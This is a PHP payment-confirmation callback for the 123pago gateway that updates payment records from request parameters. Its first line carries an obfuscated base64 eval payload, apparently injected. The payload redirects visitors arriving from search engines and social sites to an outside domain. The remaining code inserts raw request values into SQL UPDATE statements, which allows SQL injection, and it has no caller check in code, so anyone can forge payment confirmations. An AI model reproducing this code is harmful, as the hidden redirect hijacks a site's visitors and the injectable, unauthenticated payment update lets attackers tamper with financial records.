<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));

//es necesario crear el archivo de .htaccess para el acceso 
//solamente de los ip de los servidores de 123pago
require '../lib/function_gen.php';

$valid = "11";
$doc_soporte123 = "000000000000";

if (isset($_REQUEST["Parametro1"]))
    $valid = $_REQUEST["Parametro1"];
if (isset($_REQUEST["Parametro2"]))
    $doc_soporte123 = $_REQUEST["Parametro2"];
	
if (isset($_REQUEST["parametro1"]))
   $valid = $_REQUEST["parametro1"];
if (isset($_REQUEST["parametro2"]))
    $doc_soporte123 = $_REQUEST["parametro2"];

if ($valid == "00") {

	
	//Se indica el prefijo de la aplicacion que va a configurar
	$prefix = substr($doc_soporte123, 0, 5);
	
	//Se intenta llegar a ese prefijo y modificar los pago
	switch ($prefix){
		case "mpbd_":
			/********************************************************************************
			 PAGO DE MODULO DE BALANCE
			/********************************************************************************/
			$query = "	UPDATE	[mp_Documento_Doc]
						SET	    [BMP_CodigoPg] = 300,
								[BMP_CodigoEst] = 3,
								[BMP_CodigoBan] = 400,
								[Doc_PgFechaConf] = '".date("y/m/d")."'
						WHERE	([Doc_PgSoporte] = '".$doc_soporte123."');"; 
			$data = fnc_ejecutaQuery($query);
		break;
		case "ISRL-":
			/********************************************************************************
	 		PAGO DE EVENTO ISRL
			/********************************************************************************/
			$doc_soporte123 = substr($doc_soporte123, 5, strlen($doc_soporte123));
			
			$query   = "UPDATE mt_usuario_foroisrl SET verificacion_pago=1, fecha_pago='".date("Y-m-d")."' WHERE tipo_identificacion+nro_identificacion ='".trim($doc_soporte123)."'";
			$data    = fnc_ejecutaQuery($query);
			break; 			
	}
}
?>